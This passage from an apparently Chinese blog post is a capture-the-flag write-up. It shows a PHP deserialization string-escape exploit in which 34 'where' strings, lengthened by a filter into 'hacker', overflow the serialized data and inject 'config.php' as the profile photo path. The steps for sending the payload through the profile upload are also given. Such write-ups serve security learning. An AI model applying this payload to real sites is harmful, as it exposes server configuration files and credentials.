    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'12345678901'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'for@example.com'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";}'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'upload/43892f297aksddn84743894a0eiek69f'</span><span class="token punctuation">;</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre>
    <p>
     但看了wp ，还要把nickname数组化
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'12345678901'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'for@example.com'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'upload/43892f297aksddn84743894a0eiek69f'</span><span class="token punctuation">;</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre>
    <pre><code>"a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:15:"for@example.com";s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:39:"upload/43892f297aksddn84743894a0eiek69f";}"
</code></pre>
    <p>
     多了一个 } 所以要用34个where
    </p>
    <h2>
     <a id="_383">
     </a>
     解题
    </h2>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/8ec3269f6f27494f9ec6942b4a3db1cf.png"/>
    </p>
    <p>
     先注册个用户
    </p>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/834e9dc3342d4d22aa7a41c02e296dfa.png"/>
    </p>
    <p>
     可以看到，直接进到 update.php了
    </p>
    <p>
     上传一个图片
     <br/>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/410363b3b92f48d48f76b1443b496950.png"/>
    </p>
    <p>
     抓包改name为数组
    </p>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/569b37d8da1b474e9e7f532236a32c86.png"/>
    </p>
    <p>
     访问profile
    </p>
    <p>
     f12
     <br/>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/303796f805294068b2bc5057a61feaff.png"/>
    </p>
    <p>
     得到
     <br/>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/a1eb51110e0644b1ac54855db58fddf5.png"/>
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="687474:70733a2f2f626c6f672e6373646e2e6e65742f68646469312f:61727469636c652f64657461696c732f313436323932353037" class_="artid" style="display:none">
 </p>
</div>


